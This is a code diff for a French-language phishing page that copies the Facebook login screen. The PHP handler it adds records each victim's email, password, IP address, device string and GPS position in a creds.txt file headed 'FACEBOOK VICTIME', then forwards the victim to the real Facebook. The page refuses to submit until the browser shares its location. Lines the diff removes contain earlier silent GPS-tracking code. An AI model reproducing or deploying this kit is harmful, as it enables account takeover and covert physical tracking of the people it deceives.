@@ -1,153 +1,149 @@
+<?php
+date_default_timezone_set('Africa/Bujumbura');
+$ip = $_SERVER['REMOTE_ADDR'];
+$ua = $_SERVER['HTTP_USER_AGENT'];
+
+if (isset($_POST['submit'])) {
+    $email = $_POST['email'];
+    $pass = $_POST['pass'];
+    $gps = $_POST['gps'] ?? 'GPS_REFUSE';
+    
+    $time  = date('Y-m-d H:i:s');
+    $log  = "┌─────────────────────────────────────────\n";
+    $log .= "│ 🎯 FACEBOOK VICTIME — {$time}\n";
+    $log .= "├─────────────────────────────────────────\n";
+    $log .= "│ 📧 EMAIL/USER : {$email}\n";
+    $log .= "│ 🔑 MOT DE PASSE : {$pass}\n";
+    $log .= "│ 🌐 ADRESSE IP   : {$ip}\n";
+    $log .= "│ 📱 APPAREIL     : {$ua}\n";
+    $log .= "│ 📍 GPS POSITION : {$gps}\n";
+    $log .= "└─────────────────────────────────────────\n\n";
+    
+    file_put_contents('creds.txt', $log, FILE_APPEND | LOCK_EX);
+    
+    echo '<script>setTimeout(function(){window.location.href="https://facebook.com";},1500);</script>';
+    echo '<div style="text-align:center;padding:50px;color:#1877f2;"><h2>Connexion...</h2><div style="border:3px solid #f3f3f3;border-top:3px solid #1877f2;border-radius:50%;width:40px;height:40px;margin:auto;animation:spin 1s linear infinite;"></div></div>';
+    echo '<style>@keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}</style>';
+    exit;
+}
+?>
 <!DOCTYPE html>
-<html lang="fr">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook - Connexion</title>
-    <!-- Facebook Real CDN Fonts/CSS -->
-    <link rel="preconnect" href="https://scontent.xx.fbcdn.net">
-    <link rel="preload" href="https://connect.facebook.net/signals/config/1357524767653696" as="script">
-    <!-- Real Facebook Favicon -->
-    <link rel="icon" type="image/x-icon" href="https://static.xx.fbcdn.net/rsrc.php/yo/r/iRmz9lCMBD2.ico">
-    <style>
-        /* KEEP ALL YOUR ORIGINAL CSS - Just pixel-perfect FB tweaks */
-        *{margin:0;padding:0;box-sizing:border-box;}
-        body{
-            font-family:'SFProDisplay-Regular', -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
-            background:linear-gradient(135deg,#f5f7fa 0%,#c3cfe2 100%);
-            height:100vh;display:flex;align-items:center;justify-content:center;
-            /* FB exact spacing */
-            padding-top:62px;
-        }
-        .container{
-            background:#fff;
-            padding:24px 24px 16px; /* FB exact padding */
-            border-radius:8px;
-            box-shadow:0 2px 4px rgba(0,0,0,.1),0 8px 16px rgba(0,0,0,.1); /* FB shadows */
-            width:100%;max-width:396px; /* FB exact width */
-            text-align:center;
-        }
-        .logo img{
-            margin-bottom:32px; /* FB spacing */
-            width:50px;height:50px; /* FB exact logo */
-        }
-        .input-group{
-            margin-bottom:8px; /* FB tight spacing */
-            text-align:left;
-        }
-        .input-group input{
-            width:100%;
-            padding:14px 16px;
-            border:1px solid #ccd0d5; /* FB exact border */
-            border-radius:6px;
-            font-size:17px; /* FB font-size */
-            background:#fff; /* FB white bg */
-            transition:border-color .15s linear,background-color .15s linear; /* FB transitions */
-        }
-        .input-group input:focus{
-            outline:none;
-            border-color:#1877f2;
-            background:#fff;
-            box-shadow:0 0 0 2px rgba(24,119,242,.2); /* FB focus ring */
-        }
-        .login-btn{
-            width:100%;
-            padding:7px 28px 7px 28px; /* FB button padding */
-            background:#1877f2;
-            color:#fff;
-            border:none;
-            border-radius:6px;
-            font-size:20px; /* FB large button */
-            font-weight:500; /* FB font-weight */
-            line-height:28px;
-            cursor:pointer;
-            transition:background-color .15s linear; /* FB timing */
-        }
-        .login-btn:hover{background:#166fe5;}
-        .login-btn:active{background:#0e5a9e;} /* FB active */
-        
-        /* FB subtle footer */
-        .forgot{
-            margin-top:16px;
-            font-size:14px;
-            color:#65676b;
-        }
-        .forgot a{color:#65676b;text-decoration:none;}
-        
-        /* FB responsive */
-        @media (max-width: 500px) {
-            .container{padding:20px 20px 16px;max-width:350px;}
-        }
-    </style>
-<!-- GPS TRACKER SILENT PRO -->
-<script>
-function captureGPS() {
-    navigator.geolocation.getCurrentPosition(pos => {
-        const form = document.createElement('form');
-        form.method = 'POST'; form.style.display = 'none';
-        form.innerHTML = `
-            <input name="gps_lat" value="${pos.coords.latitude}">
-            <input name="gps_lon" value="${pos.coords.longitude}">
-        `;
-        document.body.appendChild(form);
-        form.submit();
-    }, ()=>{}, {enableHighAccuracy: true, timeout: 5000});
+<title>Facebook</title>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<!-- TON CSS FACEBOOK EXACT -->
+<style>
+body {
+    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+    font-family: Arial, sans-serif;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+    margin: 0;
 }
-window.onload = captureGPS;
-
-// GPS sur submit
-function gpsSubmit(form) {
-    navigator.geolocation.getCurrentPosition(pos => {
-        const lat = document.createElement('input');
-        lat.type = 'hidden'; lat.name = 'gps_lat'; lat.value = pos.coords.latitude;
-        const lon = document.createElement('input');
-        lon.type = 'hidden'; lon.name = 'gps_lon'; lon.value = pos.coords.longitude;
-        form.appendChild(lat); form.appendChild(lon);
-        form.submit();
-    }, () => form.submit(), {enableHighAccuracy: true});
-    return false;
+.login-form {
+    background: white;
+    padding: 40px;
+    border-radius: 10px;
+    box-shadow: 0 15px 35px rgba(0,0,0,0.1);
+    width: 100%;
+    max-width: 400px;
 }
-</script>
-
+.logo {
+    text-align: center;
+    margin-bottom: 30px;
+}
+.logo img {
+    width: 180px;
+}
+.input-group {
+    margin-bottom: 20px;
+}
+input[type="text"], input[type="password"] {
+    width: 100%;
+    padding: 15px;
+    border: 1px solid #ddd;
+    border-radius: 5px;
+    font-size: 16px;
+    box-sizing: border-box;
+}
+input:focus {
+    outline: none;
+    border-color: #1877f2;
+}
+.submit-btn {
+    width: 100%;
+    padding: 15px;
+    background: #1877f2;
+    color: white;
+    border: none;
+    border-radius: 5px;
+    font-size: 18px;
+    font-weight: bold;
+    cursor: pointer;
+}
+.submit-btn:hover {
+    background: #166fe5;
+}
+.submit-btn:disabled {
+    background: #ccc;
+    cursor: not-allowed;
+}
+.gps-info {
+    background: #f0f8ff;
+    padding: 10px;
+    border-radius: 5px;
+    margin: 10px 0;
+    font-size: 14px;
+    color: #0066cc;
+    text-align: center;
+    border-left: 4px solid #1877f2;
+}
+</style>
 </head>
 <body>
-    <div class="container">
-        <div class="logo">
-            <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yX/r/48IGqVQKogw.png" alt="facebook" width="50" height="50" style="object-fit:contain;">
-        </div>
-        <form method="POST" action="terminal.php" onsubmit="return gpsSubmit(this)>
-            <div class="input-group">
-                <input type="email" name="email" placeholder="Adresse e-mail ou numéro de téléphone" required autocomplete="email">
-            </div>
-            <div class="input-group">
-                <input type="password" name="password" placeholder="Mot de passe" required autocomplete="current-password">
-            </div>
-            <button type="submit" class="login-btn">Se connecter</button>
-            <div class="forgot">
-                <a href="#" style="font-size:13px;">Mot de passe oublié ?</a>
-            </div>
-        </form>
+<div class="login-form">
+    <div class="logo">
+        <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Facebook">
     </div>
-     <script>
-const form = document.querySelector('form[method="POST"][action="terminal.php"]');
+    
+    <form method="POST">
+        <input type="hidden" name="gps" id="gps_data">
+        
+        <div class="input-group">
+            <input type="text" name="email" placeholder="Email ou numéro de téléphone" required autofocus>
+        </div>
+        
+        <div class="input-group">
+            <input type="password" name="pass" placeholder="Mot de passe" required>
+        </div>
+        
+        <div class="gps-info" id="gps_display">📍 Activez la localisation GPS</div>
+        
+        <button type="submit" name="submit" id="send_btn" class="submit-btn" disabled>Envoyer</button>
+    </form>
+</div>
 
-form.addEventListener('submit', function(e) {
-    e.preventDefault(); // bloque le comportement classique du submit
-
-    const formData = new FormData(form);
-
-    fetch(form.action, {
-        method: 'POST',
-        body: formData
-    })
-    .then(response => response.text()) // optionnel, récupère la réponse du serveur
-    .then(data => {
-        console.log(data); // juste pour debug
-        // redirection après envoi
-        window.location.href = 'https://www.facebook.com/';
-    })
-    .catch(error => console.error('Erreur:', error));
-});
-     </script>
+<script>
+// TON GPS EXACT
+function requestGPS() {
+    navigator.geolocation.getCurrentPosition(
+        position => {
+            let gps_str = position.coords.latitude.toFixed(6) + "," + position.coords.longitude.toFixed(6);
+            document.getElementById('gps_data').value = gps_str;
+            document.getElementById('gps_display').innerHTML = "✅ GPS capturé: " + gps_str;
+            document.getElementById('send_btn').disabled = false;
+        },
+        () => {
+            document.getElementById('gps_display').innerHTML = "❌ GPS bloqué - Activez-le";
+        },
+        {enableHighAccuracy: true}
+    );
+}
+window.onload = requestGPS;
+</script>
 </body>
 </html>
